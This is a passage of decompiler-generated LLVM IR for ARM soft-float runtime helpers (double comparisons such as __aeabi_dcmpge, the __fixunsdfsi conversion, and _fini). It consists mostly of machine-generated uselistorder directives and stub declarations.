  %v2_1f6b4 = bitcast i64 %v1_1f6b4 to double
  %v3_1f6b4 = load i32, i32* @r2, align 4
  %v4_1f6b4 = sext i32 %v3_1f6b4 to i64
  %v5_1f6b4 = bitcast i64 %v4_1f6b4 to double
  %v7_1f6b4 = fcmp oeq double %v2_1f6b4, %v5_1f6b4
  store i1 true, i1* @cpsr_c, align 1
  %not.v6_1f6b4 = fcmp ule double %v2_1f6b4, %v5_1f6b4
  %not.v7_1f6b4 = xor i1 %v7_1f6b4, true
  %v1_1f6b8 = and i1 %not.v6_1f6b4, %not.v7_1f6b4
  store i1 %v7_1f6b4, i1* @cpsr_z, align 1
  br i1 %v1_1f6b8, label %bb, label %bb3

bb:                                               ; preds = %entry
  store i1 false, i1* @cpsr_c, align 1
  store i1 %v7_1f6b4, i1* @cpsr_z, align 1
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  ret i32 %v3_1f6b0

; uselistorder directives
  uselistorder i1 %v7_1f6b4, { 1, 2, 0 }
  uselistorder i32* @r2, { 15, 72, 73, 74, 75, 3, 76, 77, 78, 79, 80, 81, 11, 82, 83, 84, 88, 12, 90, 91, 92, 93, 94, 99, 110, 111, 112, 113, 114, 115, 21, 116, 117, 118, 119, 120, 24, 89, 22, 23, 162, 97, 98, 4, 87, 121, 122, 123, 13, 41, 10, 176, 177, 178, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 101, 102, 104, 105, 106, 108, 153, 109, 14, 85, 86, 179, 183, 184, 185, 186, 2, 198, 95, 96, 5, 180, 163, 166, 167, 168, 6, 169, 170, 171, 7, 164, 165, 172, 8, 173, 154, 103, 139, 140, 141, 142, 42, 52, 100, 187, 194, 195, 188, 189, 190, 191, 192, 193, 0, 1, 196, 9, 197, 143, 144, 145, 147, 146, 148, 149, 150, 151, 152, 107, 60, 61, 57, 181, 182, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 43, 44, 45, 46, 47, 48, 49, 50, 51, 53, 54, 55, 56, 58, 59, 62, 16, 17, 18, 19, 20, 63, 64, 65, 66, 67, 68, 69, 70, 71, 155, 156, 157, 158, 159, 160, 161, 174, 175 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dcmpeq(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v0_1f6cc = call i32 @__aeabi_cdcmple()
  %v0_1f6d0 = load i1, i1* @cpsr_z, align 1
  %.v0_1f6cc. = zext i1 %v0_1f6d0 to i32
  ret i32 %.v0_1f6cc.
}

define i32 @__aeabi_dcmplt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_1f6e4 = call i32 @__aeabi_cdcmple()
  %v0_1f6e8 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_1f6e8 to i32
  %.v0_1f6e4. = xor i32 %tmp2, 1
  ret i32 %.v0_1f6e4.
}

define i32 @__aeabi_dcmple() local_unnamed_addr {
entry:
  %v0_1f6fc = call i32 @__aeabi_cdcmple()
  %v0_1f700 = load i1, i1* @cpsr_z, align 1
  %v1_1f700 = load i1, i1* @cpsr_c, align 1
  %v2_1f700 = xor i1 %v1_1f700, true
  %v3_1f700 = or i1 %v0_1f700, %v2_1f700
  %.v0_1f6fc = select i1 %v3_1f700, i32 1, i32 %v0_1f6fc
  %v2_1f704 = xor i1 %v0_1f700, true
  %v3_1f704 = and i1 %v1_1f700, %v2_1f704
  %..v0_1f6fc = select i1 %v3_1f704, i32 0, i32 %.v0_1f6fc
  ret i32 %..v0_1f6fc

; uselistorder directives
  uselistorder i1 %v1_1f700, { 1, 0 }
  uselistorder i32 ()* @__aeabi_cdcmple, { 2, 1, 0, 3 }
}

define i32 @__aeabi_dcmpge(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_1f710 = load i32, i32* @lr, align 4
  store i32 %v0_1f710, i32* %stack_var_-8, align 4
  %v0_1f714 = call i32 @__aeabi_cdrcmple()
  %v0_1f718 = load i1, i1* @cpsr_z, align 1
  %v1_1f718 = load i1, i1* @cpsr_c, align 1
  %v2_1f718 = xor i1 %v1_1f718, true
  %v3_1f718 = or i1 %v0_1f718, %v2_1f718
  %.v0_1f714 = select i1 %v3_1f718, i32 1, i32 %v0_1f714
  %v2_1f71c = xor i1 %v0_1f718, true
  %v3_1f71c = and i1 %v1_1f718, %v2_1f71c
  %..v0_1f714 = select i1 %v3_1f71c, i32 0, i32 %.v0_1f714
  %v2_1f720 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1f720, i32* @lr, align 4
  ret i32 %..v0_1f714

; uselistorder directives
  uselistorder i1 %v1_1f718, { 1, 0 }
  uselistorder i1 true, { 2, 3, 4, 5, 0, 102, 1, 93, 6, 7, 8, 9, 10, 11, 85, 86, 94, 95, 87, 12, 13, 14, 88, 89, 90, 96, 15, 16, 17, 18, 21, 20, 19, 104, 105, 106, 107, 108, 109, 110, 91, 111, 112, 113, 98, 114, 115, 116, 117, 92, 118, 119, 120, 121, 122, 123, 124, 22, 125, 103, 126, 23, 24, 25, 26, 27, 28, 29, 97, 127, 30, 31, 32, 99, 35, 36, 37, 38, 33, 34, 100, 39, 40, 41, 42, 101, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 83, 72, 73, 74, 75, 84, 76, 77, 78, 79, 80, 81, 82 }
  uselistorder i1* @cpsr_z, { 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 42, 14, 15, 16, 17, 18, 19, 20, 21, 38, 39, 40, 41, 22, 23, 24, 37, 25, 26 }
  uselistorder i32* @lr, { 30, 31, 32, 33, 34, 8, 9, 10, 11, 12, 35, 0, 36, 1, 37, 38, 39, 41, 42, 46, 47, 48, 52, 53, 54, 55, 56, 57, 58, 59, 62, 72, 73, 66, 74, 75, 76, 77, 78, 79, 80, 81, 13, 82, 83, 84, 92, 85, 86, 87, 88, 89, 90, 91, 93, 63, 64, 65, 49, 50, 51, 17, 138, 139, 140, 141, 142, 143, 144, 145, 146, 67, 68, 69, 70, 71, 43, 44, 45, 96, 97, 98, 99, 100, 101, 102, 60, 61, 103, 104, 40, 14, 15, 117, 118, 119, 23, 24, 25, 26, 29, 147, 148, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 2, 132, 133, 135, 136, 134, 94, 95, 105, 106, 107, 108, 109, 110, 3, 4, 111, 112, 113, 114, 115, 16, 116, 137, 18, 19, 20, 21, 22, 5, 6, 7, 27, 28 }
}

define i32 @__aeabi_dcmpgt() local_unnamed_addr {
entry:
  %v0_1f72c = call i32 @__aeabi_cdrcmple()
  %v0_1f730 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_1f730 to i32
  %.v0_1f72c. = xor i32 %tmp2, 1
  ret i32 %.v0_1f72c.

; uselistorder directives
  uselistorder i32 1, { 582, 597, 712, 598, 583, 1147, 1064, 1148, 713, 260, 265, 264, 267, 262, 263, 261, 266, 1149, 714, 1150, 715, 174, 176, 172, 173, 175, 408, 245, 244, 552, 275, 716, 409, 410, 1151, 1152, 95, 94, 1153, 501, 502, 503, 717, 272, 273, 268, 269, 270, 271, 1154, 507, 1155, 1156, 607, 1157, 1158, 718, 48, 49, 50, 44, 45, 47, 46, 1159, 1160, 719, 251, 250, 1161, 608, 609, 1162, 1176, 722, 721, 720, 412, 414, 411, 413, 1178, 723, 42, 43, 1179, 553, 1180, 1181, 724, 26, 27, 1182, 725, 28, 225, 224, 341, 1183, 727, 726, 388, 387, 386, 728, 369, 610, 1184, 1185, 1186, 524, 1187, 589, 554, 1188, 1189, 527, 1190, 1191, 731, 730, 729, 415, 417, 418, 416, 732, 421, 420, 419, 1192, 1193, 1194, 1203, 1204, 1205, 1212, 611, 612, 741, 740, 739, 738, 708, 737, 736, 735, 734, 733, 423, 427, 424, 425, 426, 422, 1215, 742, 171, 168, 170, 169, 584, 1236, 1237, 577, 1238, 1240, 508, 1241, 614, 573, 572, 613, 1242, 519, 536, 570, 590, 1243, 1244, 1245, 1246, 1247, 0, 1248, 1239, 615, 1249, 579, 750, 699, 749, 748, 747, 746, 745, 744, 743, 221, 220, 218, 219, 1250, 1251, 1252, 1253, 1254, 509, 1255, 751, 256, 259, 255, 253, 252, 254, 257, 258, 1065, 1066, 1067, 1068, 1069, 1070, 1071, 1072, 555, 1073, 1074, 755, 754, 753, 752, 239, 240, 241, 242, 1075, 1076, 1077, 1078, 1079, 758, 757, 756, 235, 230, 234, 237, 233, 232, 231, 229, 238, 236, 556, 1256, 557, 1257, 1258, 1259, 1260, 1, 1261, 1262, 1263, 1264, 1265, 1266, 760, 759, 158, 157, 160, 161, 156, 162, 159, 599, 1267, 1268, 1269, 1270, 1271, 761, 279, 278, 280, 281, 282, 1216, 762, 428, 429, 430, 763, 274, 764, 246, 247, 248, 249, 765, 178, 177, 179, 1272, 1273, 1274, 766, 433, 435, 434, 431, 432, 767, 182, 183, 180, 186, 184, 181, 185, 226, 192, 197, 191, 196, 200, 199, 195, 198, 193, 194, 768, 207, 206, 204, 203, 205, 201, 202, 769, 208, 209, 216, 217, 213, 214, 212, 215, 210, 211, 436, 308, 307, 1206, 616, 1207, 1208, 1209, 1210, 1211, 770, 87, 88, 86, 89, 228, 227, 558, 1275, 1276, 1295, 1296, 772, 771, 90, 92, 93, 91, 528, 578, 529, 1379, 1380, 1381, 1382, 559, 773, 41, 1111, 1112, 35, 36, 537, 1163, 1448, 1164, 1165, 1166, 538, 1113, 1168, 1167, 515, 774, 1114, 775, 438, 439, 440, 437, 1297, 539, 1298, 1450, 540, 1451, 1452, 1453, 1454, 1455, 1456, 1049, 1457, 1458, 1459, 1460, 1461, 1462, 1050, 700, 777, 776, 11, 12, 17, 19, 18, 13, 10, 14, 16, 15, 1226, 1217, 1224, 1225, 574, 541, 68, 66, 67, 70, 69, 617, 1218, 1219, 1222, 1223, 778, 701, 339, 340, 1221, 779, 163, 165, 166, 167, 164, 618, 1220, 781, 780, 444, 442, 445, 441, 443, 446, 1227, 782, 385, 384, 383, 1169, 1170, 783, 374, 373, 542, 560, 1299, 1300, 1301, 619, 1302, 525, 561, 520, 543, 1303, 620, 1304, 1305, 1306, 2, 1307, 513, 1308, 510, 1309, 621, 1310, 1311, 1312, 562, 1313, 796, 795, 794, 793, 792, 791, 790, 789, 788, 787, 786, 785, 702, 784, 141, 152, 140, 142, 148, 145, 143, 146, 144, 153, 154, 149, 147, 150, 151, 1314, 1315, 363, 361, 366, 368, 364, 365, 362, 367, 155, 521, 797, 37, 38, 798, 190, 1228, 1229, 1231, 1232, 622, 1233, 1234, 1235, 544, 801, 800, 799, 448, 447, 451, 449, 450, 452, 1316, 1317, 1318, 802, 61, 63, 62, 64, 59, 58, 60, 65, 803, 1195, 1196, 1197, 805, 804, 39, 40, 1319, 807, 806, 29, 31, 30, 32, 33, 34, 563, 591, 810, 809, 808, 623, 1177, 811, 223, 1171, 1172, 1173, 1174, 1175, 624, 812, 20, 21, 23, 22, 24, 625, 25, 1080, 813, 397, 626, 814, 354, 627, 815, 314, 312, 313, 816, 73, 72, 71, 817, 380, 379, 818, 393, 819, 356, 355, 820, 334, 332, 333, 821, 390, 822, 376, 375, 823, 453, 824, 288, 825, 330, 826, 827, 352, 353, 564, 628, 629, 630, 631, 1124, 828, 382, 1463, 632, 1464, 1465, 633, 829, 74, 77, 78, 76, 81, 79, 80, 75, 82, 358, 634, 294, 293, 830, 454, 455, 456, 83, 1392, 1393, 833, 832, 831, 349, 398, 522, 1061, 1062, 1063, 834, 1125, 837, 836, 835, 399, 838, 530, 1198, 531, 1199, 1200, 523, 1201, 458, 459, 457, 460, 462, 461, 463, 1202, 532, 1081, 120, 123, 122, 121, 124, 1126, 565, 1127, 840, 839, 128, 126, 125, 132, 130, 131, 129, 127, 841, 137, 139, 135, 133, 134, 136, 138, 842, 96, 101, 97, 100, 99, 102, 98, 843, 844, 1466, 566, 635, 846, 845, 847, 1396, 1399, 1400, 1401, 848, 464, 469, 470, 468, 467, 471, 465, 466, 1402, 1403, 1404, 1405, 849, 476, 482, 475, 481, 480, 474, 484, 483, 478, 472, 477, 473, 479, 1397, 1398, 636, 311, 310, 1406, 1407, 1408, 1409, 1410, 1411, 585, 1412, 1413, 1414, 1415, 1416, 1417, 1418, 1419, 638, 1420, 1421, 1422, 1423, 1424, 637, 1425, 1426, 1427, 1428, 1429, 850, 318, 320, 316, 319, 324, 326, 321, 325, 327, 322, 323, 317, 347, 346, 639, 640, 1123, 526, 854, 853, 852, 851, 287, 103, 545, 243, 855, 284, 283, 381, 856, 389, 857, 402, 858, 329, 315, 859, 407, 406, 860, 338, 861, 862, 1357, 1358, 485, 864, 863, 486, 487, 1230, 865, 1130, 1131, 3, 119, 1320, 1321, 866, 488, 546, 1449, 1277, 1278, 1279, 1280, 1281, 1282, 1283, 1284, 1285, 1286, 1287, 1288, 1289, 1290, 1291, 1292, 1293, 1294, 867, 297, 295, 296, 298, 299, 1368, 1369, 84, 85, 547, 1322, 1370, 1371, 1372, 1373, 1374, 1375, 1376, 277, 1214, 1213, 1051, 1052, 1053, 1054, 1055, 1056, 1057, 1467, 187, 188, 189, 335, 641, 868, 580, 1323, 1324, 643, 1325, 1326, 1327, 1328, 1329, 644, 1330, 1331, 1332, 1333, 1334, 645, 1336, 568, 567, 1335, 642, 1337, 1338, 646, 1339, 1340, 1341, 873, 703, 872, 871, 870, 869, 107, 105, 106, 110, 114, 104, 111, 112, 108, 113, 109, 1342, 874, 490, 493, 492, 494, 489, 491, 548, 875, 392, 391, 1343, 1344, 1345, 115, 116, 117, 118, 581, 514, 1347, 1348, 533, 1349, 1350, 4, 5, 1351, 1353, 516, 1354, 648, 1355, 534, 1352, 647, 885, 884, 883, 882, 881, 880, 879, 878, 877, 876, 51, 52, 53, 649, 549, 886, 54, 55, 56, 1346, 592, 704, 1356, 887, 495, 888, 496, 1082, 889, 302, 301, 303, 305, 304, 300, 306, 650, 1083, 569, 891, 890, 892, 893, 894, 291, 290, 895, 292, 357, 896, 331, 897, 497, 898, 401, 400, 360, 359, 286, 285, 899, 343, 342, 900, 289, 901, 902, 396, 395, 903, 372, 344, 904, 404, 403, 905, 498, 378, 906, 907, 351, 350, 908, 348, 909, 371, 370, 511, 1430, 337, 336, 1084, 517, 535, 1085, 1086, 1087, 512, 653, 1088, 1089, 1090, 586, 1091, 1092, 1093, 1094, 651, 652, 587, 654, 915, 914, 913, 912, 911, 910, 1095, 1096, 922, 921, 920, 919, 918, 705, 917, 916, 655, 1097, 1098, 924, 923, 1099, 1100, 656, 657, 658, 659, 660, 925, 1101, 1102, 663, 1103, 661, 1104, 1105, 662, 1106, 664, 505, 934, 933, 932, 931, 930, 929, 928, 927, 926, 345, 1107, 665, 1108, 1109, 666, 1110, 667, 506, 943, 942, 941, 940, 939, 938, 937, 936, 935, 328, 1115, 1116, 668, 949, 948, 947, 946, 945, 944, 394, 669, 670, 950, 1117, 671, 1118, 1119, 1120, 956, 955, 954, 953, 952, 951, 405, 1121, 961, 960, 959, 958, 957, 1122, 672, 966, 965, 964, 963, 962, 673, 674, 675, 970, 969, 968, 967, 975, 710, 974, 709, 973, 972, 971, 979, 978, 977, 976, 1128, 676, 1058, 1059, 678, 1060, 677, 1048, 1129, 988, 987, 986, 985, 984, 983, 982, 981, 980, 500, 499, 600, 1132, 1133, 1134, 679, 1135, 991, 990, 989, 993, 992, 994, 601, 1136, 995, 998, 997, 996, 6, 680, 575, 1000, 999, 1137, 1002, 1001, 593, 1138, 681, 682, 1140, 1139, 683, 1005, 1004, 1003, 602, 1141, 1142, 684, 685, 686, 1143, 706, 1144, 687, 1006, 594, 688, 689, 1145, 690, 1146, 1014, 1013, 1012, 1011, 1010, 1009, 1008, 1007, 595, 596, 1015, 571, 1359, 1360, 1361, 691, 518, 1362, 1363, 1364, 692, 1365, 1019, 1018, 1017, 1016, 707, 1366, 377, 1367, 1020, 693, 1377, 1023, 1022, 1021, 1378, 57, 604, 1383, 1384, 603, 1385, 1386, 605, 606, 1387, 1388, 1024, 1389, 7, 8, 1391, 1390, 694, 1027, 1026, 1025, 695, 1394, 1395, 1029, 1028, 1032, 1031, 1030, 1035, 1034, 1033, 1037, 1036, 1431, 1432, 696, 1441, 1442, 576, 1443, 1039, 1038, 588, 9, 1043, 1042, 1041, 1040, 551, 1433, 1434, 1435, 550, 1436, 1439, 1440, 697, 1044, 698, 1437, 1438, 1045, 222, 1444, 1445, 276, 1446, 1447, 309, 1046, 1047, 504, 711 }
  uselistorder i1 false, { 38, 14, 15, 12, 16, 51, 52, 53, 54, 55, 56, 9, 10, 13, 57, 58, 59, 11, 39, 36, 40, 41, 42, 43, 44, 4, 17, 18, 37, 2, 31, 60, 0, 22, 23, 24, 45, 19, 21, 46, 47, 48, 49, 50, 33, 3, 6, 61, 20, 25, 28, 27, 26, 29, 7, 8, 1, 30, 5, 35, 32, 34, 62, 63, 64, 65 }
  uselistorder i1* @cpsr_c, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 ()* @__aeabi_cdrcmple, { 1, 0 }
}

define i32 @__fixunsdfsi(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1f740 = icmp slt i32 %arg2, 0
  %v2_1f740 = mul i32 %arg2, 2
  br i1 %v1_1f740, label %dec_label_pc_1f774, label %dec_label_pc_1f748

dec_label_pc_1f748:                               ; preds = %entry
  %v1_1f748 = add i32 %v2_1f740, 2097152
  %v2_1f748 = icmp ugt i32 %v2_1f740, -2097153
  br i1 %v2_1f748, label %dec_label_pc_1f77c, label %dec_label_pc_1f750

dec_label_pc_1f750:                               ; preds = %dec_label_pc_1f748
  %v6_1f748 = icmp slt i32 %v1_1f748, 0
  br i1 %v6_1f748, label %dec_label_pc_1f754, label %dec_label_pc_1f774

dec_label_pc_1f754:                               ; preds = %dec_label_pc_1f750
  %v4_1f758 = sdiv i32 %v1_1f748, 2097152
  %v5_1f758 = sub nsw i32 -993, %v4_1f758
  %v11_1f758 = icmp slt i32 %v5_1f758, 0
  br i1 %v11_1f758, label %dec_label_pc_1f784, label %dec_label_pc_1f760

dec_label_pc_1f760:                               ; preds = %dec_label_pc_1f754
  %v3_1f760 = mul i32 %arg2, 2048
  %v4_1f768 = udiv i32 %arg1, 2097152
  %v1_1f764 = or i32 %v4_1f768, %v3_1f760
  %v5_1f768 = or i32 %v1_1f764, -2147483648
  %v6_1f76c = lshr i32 %v5_1f768, %v5_1f758
  ret i32 %v6_1f76c

dec_label_pc_1f774:                               ; preds = %dec_label_pc_1f750, %entry
  ret i32 0

dec_label_pc_1f77c:                               ; preds = %dec_label_pc_1f748
  %v4_1f77c = mul i32 %arg2, 4096
  %v5_1f77c = or i32 %v4_1f77c, %arg1
  %v7_1f77c = icmp eq i32 %v5_1f77c, 0
  br i1 %v7_1f77c, label %dec_label_pc_1f784, label %dec_label_pc_1f78c

dec_label_pc_1f784:                               ; preds = %dec_label_pc_1f77c, %dec_label_pc_1f754
  ret i32 -1

dec_label_pc_1f78c:                               ; preds = %dec_label_pc_1f77c
  ret i32 0

; uselistorder directives
  uselistorder i32 -1, { 0, 47, 289, 191, 192, 50, 51, 48, 49, 193, 52, 1, 194, 195, 196, 197, 2, 198, 199, 3, 4, 200, 90, 201, 91, 312, 173, 314, 92, 315, 155, 316, 317, 318, 5, 93, 319, 320, 202, 203, 152, 204, 161, 94, 6, 205, 329, 80, 81, 330, 206, 156, 207, 158, 208, 7, 209, 160, 159, 333, 334, 69, 70, 71, 72, 74, 82, 8, 9, 78, 290, 10, 11, 12, 96, 100, 95, 97, 149, 150, 101, 99, 98, 174, 291, 102, 323, 103, 335, 210, 336, 337, 292, 293, 294, 104, 295, 105, 296, 13, 211, 338, 339, 212, 53, 54, 340, 213, 88, 55, 214, 341, 56, 14, 57, 215, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 216, 217, 15, 218, 153, 324, 326, 219, 106, 325, 220, 107, 342, 222, 343, 344, 89, 83, 84, 345, 346, 347, 348, 349, 162, 108, 350, 163, 16, 221, 85, 86, 223, 351, 352, 353, 224, 175, 176, 354, 17, 58, 225, 328, 321, 177, 226, 355, 356, 178, 313, 227, 19, 18, 228, 229, 20, 297, 230, 109, 399, 110, 305, 111, 375, 79, 376, 112, 371, 113, 298, 114, 115, 369, 21, 116, 377, 378, 117, 22, 306, 23, 231, 232, 233, 234, 379, 322, 180, 179, 118, 299, 77, 235, 119, 300, 236, 24, 237, 181, 380, 28, 238, 239, 27, 29, 381, 26, 240, 241, 59, 25, 242, 60, 61, 62, 63, 243, 244, 245, 73, 307, 308, 30, 370, 120, 332, 121, 122, 309, 123, 382, 124, 366, 125, 126, 304, 127, 331, 75, 246, 357, 247, 64, 65, 248, 249, 250, 251, 252, 128, 253, 254, 255, 182, 129, 358, 256, 257, 359, 360, 66, 361, 362, 87, 363, 258, 259, 154, 164, 157, 364, 31, 260, 365, 261, 76, 262, 67, 310, 130, 372, 131, 401, 132, 327, 133, 134, 383, 135, 301, 136, 403, 137, 311, 138, 400, 139, 368, 140, 302, 141, 367, 142, 303, 143, 144, 145, 373, 146, 402, 147, 374, 263, 264, 148, 183, 32, 33, 265, 266, 267, 38, 39, 40, 34, 35, 36, 37, 268, 269, 270, 271, 272, 184, 185, 273, 274, 275, 276, 277, 41, 68, 42, 43, 151, 186, 187, 188, 44, 278, 279, 280, 170, 171, 172, 45, 281, 165, 166, 167, 168, 169, 46, 282, 283, 284, 285, 286, 287, 288, 189, 190 }
  uselistorder i32 4096, { 0, 1, 2, 3, 4, 22, 5, 6, 23, 7, 8, 9, 10, 24, 28, 16, 29, 27, 13, 11, 14, 32, 15, 17, 18, 25, 26, 19, 30, 20, 31, 12, 21 }
  uselistorder i32 -2147483648, { 0, 6, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 4, 5, 16, 17, 3, 2, 18, 19, 20, 21 }
  uselistorder i32 2048, { 0, 1, 2, 3, 4, 5, 6, 7, 13, 14, 15, 16, 10, 11, 9, 12, 17, 8 }
  uselistorder i32 2097152, { 8, 9, 15, 0, 1, 2, 10, 11, 3, 4, 5, 12, 13, 14, 6, 7 }
  uselistorder i32 2, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 205, 37, 38, 39, 173, 40, 41, 42, 43, 44, 45, 46, 206, 207, 208, 210, 211, 212, 95, 213, 47, 127, 214, 215, 216, 48, 128, 217, 218, 219, 124, 129, 222, 0, 225, 174, 175, 96, 130, 226, 131, 187, 49, 188, 227, 228, 229, 50, 230, 231, 232, 176, 220, 51, 52, 53, 221, 209, 233, 234, 235, 236, 54, 55, 97, 98, 99, 258, 259, 115, 260, 261, 100, 262, 263, 223, 177, 237, 94, 238, 239, 56, 57, 240, 241, 224, 178, 132, 133, 194, 134, 195, 135, 196, 136, 197, 137, 198, 138, 58, 186, 59, 101, 60, 61, 113, 189, 92, 62, 264, 114, 249, 63, 64, 250, 65, 66, 93, 67, 68, 69, 70, 116, 251, 252, 71, 72, 1, 179, 253, 73, 254, 248, 180, 2, 74, 102, 103, 104, 118, 105, 119, 106, 107, 139, 108, 110, 109, 111, 242, 243, 125, 75, 76, 77, 78, 79, 126, 244, 120, 117, 80, 245, 246, 247, 181, 81, 82, 83, 182, 84, 85, 86, 87, 88, 140, 190, 141, 142, 143, 144, 191, 192, 145, 146, 89, 147, 148, 90, 121, 193, 149, 150, 151, 152, 122, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 165, 183, 164, 184, 166, 185, 172, 199, 167, 200, 201, 202, 203, 168, 204, 112, 169, 170, 171, 257, 123, 255, 91, 256 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_1f798 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_1f798)
  %v31_1f7a0 = load i32, i32* @r0, align 4
  ret i32 %v31_1f7a0

; uselistorder directives
  uselistorder i32* @r0, { 40, 272, 266, 267, 268, 269, 270, 271, 41, 38, 273, 101, 274, 5, 102, 275, 276, 100, 103, 277, 42, 39, 278, 279, 280, 281, 150, 43, 151, 152, 44, 45, 282, 283, 284, 285, 286, 287, 29, 288, 289, 46, 6, 290, 292, 131, 291, 2, 303, 302, 56, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 316, 317, 318, 329, 330, 331, 332, 333, 334, 335, 336, 134, 337, 153, 338, 339, 340, 342, 341, 14, 322, 343, 344, 154, 155, 47, 48, 49, 319, 132, 320, 321, 133, 50, 345, 346, 347, 348, 349, 51, 15, 53, 413, 16, 54, 17, 18, 294, 3, 295, 237, 238, 239, 7, 324, 57, 323, 58, 350, 351, 97, 98, 352, 353, 354, 99, 355, 356, 357, 59, 358, 359, 361, 362, 325, 326, 327, 328, 61, 60, 293, 296, 297, 298, 299, 300, 301, 62, 63, 156, 157, 158, 64, 65, 66, 399, 68, 414, 400, 130, 416, 417, 147, 140, 141, 142, 143, 144, 145, 146, 69, 70, 71, 148, 149, 415, 315, 80, 254, 255, 256, 257, 159, 160, 402, 72, 138, 139, 403, 8, 404, 405, 406, 407, 408, 409, 410, 411, 394, 250, 73, 386, 52, 387, 388, 78, 363, 364, 365, 74, 19, 75, 55, 366, 367, 368, 9, 10, 369, 370, 11, 13, 0, 1, 371, 372, 12, 373, 374, 375, 77, 135, 376, 377, 378, 379, 380, 76, 381, 20, 382, 383, 4, 384, 385, 360, 161, 162, 163, 164, 165, 251, 252, 166, 67, 264, 79, 81, 401, 167, 104, 168, 169, 170, 105, 106, 107, 171, 108, 109, 110, 111, 172, 173, 112, 174, 175, 176, 177, 178, 113, 114, 115, 37, 28, 116, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 36, 27, 117, 191, 192, 193, 194, 195, 35, 26, 118, 196, 197, 198, 199, 200, 34, 25, 119, 201, 202, 203, 204, 205, 206, 207, 208, 33, 209, 210, 211, 24, 120, 212, 32, 23, 121, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 31, 22, 122, 226, 227, 228, 229, 230, 30, 21, 123, 231, 232, 233, 234, 235, 124, 125, 126, 236, 240, 241, 242, 243, 127, 128, 129, 244, 245, 246, 247, 248, 249, 253, 258, 259, 260, 261, 262, 263, 265, 389, 390, 391, 392, 393, 395, 396, 397, 398, 136, 137, 412, 89, 90, 91, 92, 93, 94, 95, 96, 82, 83, 84, 85, 86, 87, 88 }
  uselistorder void (i32)* @__pseudo_branch, { 15, 75, 76, 77, 78, 79, 49, 50, 51, 38, 39, 40, 93, 58, 59, 60, 61, 62, 63, 64, 65, 66, 52, 53, 54, 55, 56, 57, 67, 68, 35, 36, 37, 80, 69, 70, 71, 72, 73, 74, 41, 42, 43, 44, 45, 46, 47, 48, 16, 17, 18, 19, 20, 21, 98, 99, 100, 101, 102, 94, 85, 95, 96, 97, 0, 29, 30, 31, 22, 23, 24, 25, 26, 27, 32, 33, 34, 103, 104, 105, 86, 87, 88, 89, 90, 91, 106, 81, 82, 83, 84, 28, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 92 }
  uselistorder i32 0, {}
  uselistorder i32* @r4, {}
}

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i64 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16 @__decompiler_undefined_function_4() local_unnamed_addr

declare i16* @__decompiler_undefined_function_5() local_unnamed_addr

declare i8** @__decompiler_undefined_function_6() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #2

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
attributes #2 = { noreturn nounwind }
